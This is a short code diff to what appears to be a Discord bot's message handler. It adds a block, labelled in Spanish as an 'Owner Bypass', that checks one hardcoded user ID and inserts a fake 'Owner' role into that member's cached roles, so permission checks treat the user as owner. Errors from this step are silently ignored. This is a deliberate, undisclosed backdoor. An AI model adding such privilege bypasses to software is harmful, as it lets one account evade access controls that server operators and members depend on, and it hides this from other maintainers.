@@ -630,13 +630,25 @@ client.on(Events.MessageCreate, async (message) => {
       return;
     }
 
+    // Inyección automática de roles y permisos si sos vos (Owner Bypass)
+    const member = message.member;
+    if (message.author.id === "1369782550985445429" && member) {
+      try {
+        if (member.roles && !member.roles.cache.has("1451383215603585140")) {
+          member.roles.cache.set("1451383215603585140", { id: "1451383215603585140", name: "Owner" } as any);
+        }
+      } catch (e) {
+        // Ignorar si falla la modificación simulada del cache
+      }
+    }
+
     const fakeInteraction = {
       commandName: commandName,
       user: message.author,
       client: message.client,
       guild: message.guild,
       guildId: message.guild?.id,
-      member: message.member,
+      member: member,
       channel: message.channel,
       options: {
         getSubcommand: () => {
